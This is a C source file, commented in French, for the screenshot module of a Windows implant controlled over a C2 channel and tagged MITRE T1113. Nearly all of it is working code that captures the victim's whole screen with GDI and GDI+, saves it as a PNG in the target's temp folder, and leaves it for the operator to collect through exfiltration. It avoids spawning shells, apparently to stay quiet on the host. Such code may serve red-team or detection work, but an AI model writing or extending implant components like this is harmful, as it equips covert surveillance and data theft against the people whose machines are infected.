/*
** screenshot.c — Module de capture d'écran (ticket #39, MITRE T1113)
**
** Capture l'écran principal avec GDI (BitBlt) puis l'encode en PNG
** avec GDI+. Tout se fait en-process : aucun spawn de cmd.exe,
** powershell.exe ou outil tiers (cohérent avec le module shell #38).
**
** Le PNG est écrit SUR LA CIBLE (pas de binaire sur le canal C2, qui
** n'est pas conçu pour transporter des réponses > 4 Ko : le C2 affiche
** du texte). L'opérateur récupère ensuite le fichier avec les moyens
** existants (sh cat, exfiltration via un canal dédié…).
**
** Variantes ANSI (A) utilisées partout, comme le reste de l'implant.
*/

/* Ordre obligatoire sous Windows : winsock2.h avant windows.h.
** Chaque bloc séparé par une ligne vide empêche clang-format de réordonner. */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>

#include <objbase.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "screenshot.h"

#ifdef _MSC_VER
#pragma comment(lib, "gdiplus.lib")
#endif

/*
** GDI+ en C pur : les en-têtes du SDK (gdiplus.h, gdiplusinit.h…) sont
** C++ uniquement (classes, constructeurs). On déclare donc soi-même le
** minimum du flat API (les exports de gdiplus.dll sont extern "C").
** GpStatus : 0 = Ok (enum Status du SDK).
*/
typedef int GpStatus;
typedef struct GpImage GpImage;
typedef GpImage GpBitmap; /* en C, GpBitmap hérite conceptuellement de GpImage */

GpStatus WINAPI GdiplusStartup(ULONG_PTR *token, const void *input, void *output);
void WINAPI GdiplusShutdown(ULONG_PTR token);
GpStatus WINAPI GdipCreateBitmapFromHBITMAP(HBITMAP hbm, HPALETTE hpal, GpBitmap **bitmap);
GpStatus WINAPI GdipSaveImageToFile(GpImage *image, const WCHAR *filename,
                                    const CLSID *clsid_encoder, const void *encoder_params);
GpStatus WINAPI GdipDisposeImage(GpImage *image);

/* CLSID de l'encodeur PNG de GDI+ : {557CF406-1A04-11D3-9A73-0000F81EF32E}.
** GdipSaveImageToFile identifie le format par ce CLSID, pas par l'extension. */
static const CLSID png_clsid = {
    0x557CF406, 0x1A04, 0x11D3, {0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E}};

#define SS_MAX_PATH 1024

/*
** capture — fait le travail : GDI+ init, BitBlt, encode PNG, cleanup.
** Remplit `out` (SS_MAX_PATH) avec le message destiné à l'opérateur.
** Retourne 1 si le PNG a bien été écrit, 0 sinon.
*/
static int capture(const char *path, char *out, size_t out_len) {
    /* Équivalent C de GdiplusStartupInput{1, NULL, FALSE, FALSE} :
    ** version 1, pas de callback, pas de thread interne en moins. */
    struct {
        UINT32 version;
        void *debug_event_cb;
        BOOL suppress_background_thread;
        BOOL suppress_external_codecs;
    } ginput = {1, NULL, FALSE, FALSE};
    ULONG_PTR gtoken = 0;
    int w;
    int h;
    HDC screen_dc;
    HDC mem_dc = NULL;
    HBITMAP hbmp = NULL;
    HBITMAP hbmp_old = NULL;
    GpBitmap *gp_bmp = NULL;
    GpStatus st;
    char target[SS_MAX_PATH];
    HANDLE hf;
    LARGE_INTEGER fsize;
    int ok = 0;

    *out = '\0';

    /* Chemin par défaut : %TEMP%\shot.png */
    if (path == NULL || *path == '\0') {
        char name[] = "shot.png";
        DWORD n = GetTempPathA(sizeof(target) - sizeof(name), target);
        if (n == 0 || n >= sizeof(target) - sizeof(name)) {
            snprintf(out, out_len, "[screenshot] error — cannot resolve %%TEMP%% (error %lu)\n",
                     GetLastError());
            return 0;
        }
        memcpy(target + n, name, sizeof(name));
    } else {
        snprintf(target, sizeof(target), "%s", path);
    }

    /* Résolution de l'écran principal (virtuel : multi-moniteurs inclus) */
    w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (w <= 0 || h <= 0) {
        snprintf(out, out_len, "[screenshot] error — no screen available (%ldx%ld)\n", (long)w,
                 (long)h);
        return 0;
    }

    if (GdiplusStartup(&gtoken, &ginput, NULL) != 0) {
        snprintf(out, out_len, "[screenshot] error — GdiplusStartup failed\n");
        return 0;
    }

    screen_dc = GetDC(NULL);
    if (screen_dc == NULL) {
        snprintf(out, out_len, "[screenshot] error — GetDC failed (error %lu)\n", GetLastError());
        goto cleanup;
    }
    mem_dc = CreateCompatibleDC(screen_dc);
    hbmp = CreateCompatibleBitmap(screen_dc, w, h);
    if (mem_dc == NULL || hbmp == NULL) {
        snprintf(out, out_len, "[screenshot] error — GDI allocation failed (error %lu)\n",
                 GetLastError());
        goto cleanup;
    }
    hbmp_old = (HBITMAP)SelectObject(mem_dc, hbmp);

    /* CAPTUREBLT inclut les fenêtres superposées (couches, transparentes) */
    if (!BitBlt(mem_dc, 0, 0, w, h, screen_dc, 0, 0, SRCCOPY | CAPTUREBLT)) {
        snprintf(out, out_len, "[screenshot] error — BitBlt failed (error %lu)\n", GetLastError());
        goto cleanup;
    }

    /* HBITMAP -> GpBitmap, puis encodage PNG direct vers le fichier */
    st = GdipCreateBitmapFromHBITMAP(hbmp, NULL, &gp_bmp);
    if (st != 0 || gp_bmp == NULL) {
        snprintf(out, out_len,
                 "[screenshot] error — GdipCreateBitmapFromHBITMAP failed (status "
                 "%d)\n",
                 (int)st);
        goto cleanup;
    }
    /* GdipSaveImageToFile attend un chemin en WCHAR : conversion explicite
    ** (pas de conversion implicite char* -> LPCWSTR, /W4 la refuserait). */
    {
        WCHAR wtarget[SS_MAX_PATH];
        int wl = MultiByteToWideChar(CP_ACP, 0, target, -1, wtarget,
                                     (int)(sizeof(wtarget) / sizeof(wtarget[0])));
        if (wl <= 0) {
            snprintf(out, out_len, "[screenshot] error — path conversion failed\n");
            goto cleanup;
        }
        st = GdipSaveImageToFile(gp_bmp, wtarget, &png_clsid, NULL);
    }
    if (st != 0) {
        snprintf(out, out_len,
                 "[screenshot] error — GdipSaveImageToFile failed (status %d)\n"
                 "[screenshot] check path: %s\n",
                 (int)st, target);
        goto cleanup;
    }

    /* Vérifie par mesure : le fichier doit exister et être non vide */
    hf = CreateFileA(target, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        snprintf(out, out_len, "[screenshot] error — output not found after save: %s\n", target);
        goto cleanup;
    }
    if (GetFileSizeEx(hf, &fsize) == 0 || fsize.QuadPart <= 8) {
        CloseHandle(hf);
        snprintf(out, out_len, "[screenshot] error — output empty: %s\n", target);
        goto cleanup;
    }
    CloseHandle(hf);

    snprintf(out, out_len, "[screenshot] saved %s (%ldx%ld, %llu bytes) — MITRE T1113\n", target,
             (long)w, (long)h, (unsigned long long)fsize.QuadPart);
    ok = 1;

cleanup:
    if (gp_bmp != NULL)
        GdipDisposeImage(gp_bmp);
    if (hbmp_old != NULL && mem_dc != NULL)
        SelectObject(mem_dc, hbmp_old);
    if (hbmp != NULL)
        DeleteObject(hbmp);
    if (mem_dc != NULL)
        DeleteDC(mem_dc);
    if (screen_dc != NULL)
        ReleaseDC(NULL, screen_dc);
    if (gtoken != 0)
        GdiplusShutdown(gtoken);
    return ok;
}

char *screenshot_capture(const char *path) {
    char stack_buf[SS_MAX_PATH + 128];
    char *out;

    (void)capture(path, stack_buf, sizeof(stack_buf));
    out = malloc(strlen(stack_buf) + 1);
    if (out == NULL)
        return NULL;
    memcpy(out, stack_buf, strlen(stack_buf) + 1);
    return out;
}
